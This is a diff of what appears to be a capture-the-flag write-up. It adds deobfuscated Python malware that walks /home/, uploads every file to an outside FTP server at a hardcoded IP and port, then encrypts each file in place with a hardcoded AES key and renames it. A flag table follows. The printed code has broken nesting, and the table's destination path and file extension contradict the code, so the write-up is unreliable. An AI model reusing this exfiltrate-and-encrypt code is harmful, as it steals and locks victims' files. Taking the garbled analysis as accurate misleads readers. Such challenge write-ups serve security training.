@@ -21,15 +21,56 @@ with open("code.py", "wb") as f:
 and we now have a `code.py` file wich is obfuscated.
 After desobfuscating it we get:
 ```py
+from Crypto.Cipher import AES as AES
+import socket as socket
+import json as json
+import os as os
+import base64 as base64
+import time as time
+import ftplib as ftplib
+import random as random
+
+
+def upload_to_ftp_server(file_path):
+    ftpServer = ftplib.FTP()
+    ftpServer.connect("13.98.138.213", 20304)
+    ftpServer.login("anonymous", "anonymous")
+    ftpServer.cwd("/srv/ooowldump/")
+    ftpServer.storbinary('\'\'' + '\'S\'' + file_path, open(file_path, "rb"))
+    ftpServer.quit()
+    def encrypt_file(file_path):
+        key = AES.new("vLuUbS2o4i6Pr8jX", AES.MODE_CBC, "bM8ftekoUEWCTbP5")
+        with open(file_path, "rb") as file:
+                    file_content = file.read()
+                    padded_data = add_padding(file_content)
+                    encrypted_data = key.encrypt(padded_data)
+        with open(file_path, "wb") as file:
+                file.write(encrypted_data)
+        
+        def find_files(directory):
+            file_list = []
+            for root, dirs, files in os.walk(directory):
+                for file_name in files:
+                    file_list.append(os.path.join(root, file_name))
+            return file_list
+        def add_padding(data):
+            return data + b"\\0" * (AES.block_size - len(data) % AES.block_size)
+        
+        for file_path in find_files('/home/'):
+            upload_to_ftp_server(file_path)
+            encrypt_file(file_path)
+            os.rename(file_path, file_path + '\'n\''[:-1] + "nc") #nnc
+        return "anonymous"
 ```
 
 So after some analyze we can easyly get the flag:
+
 |part | value |
 |---|---|
-| encryption_iv |  |
-| encryption_key |  |
-| attacker_ip |  |
-| attacker_port |  |
-| data_destination_path | |
-| data_source_path |  |
-| encrypted_file_extension | |
+| encryption_iv | bM8ftekoUEWCTbP5 |
+| encryption_key | vLuUbS2o4i6Pr8jX |
+| attacker_ip | 13.98.138.213 |
+| attacker_port | 20304 |
+| data_destination_path | /srv/www/dump/ |
+| data_source_path | /home/ |
+| encrypted_file_extension | .enc |
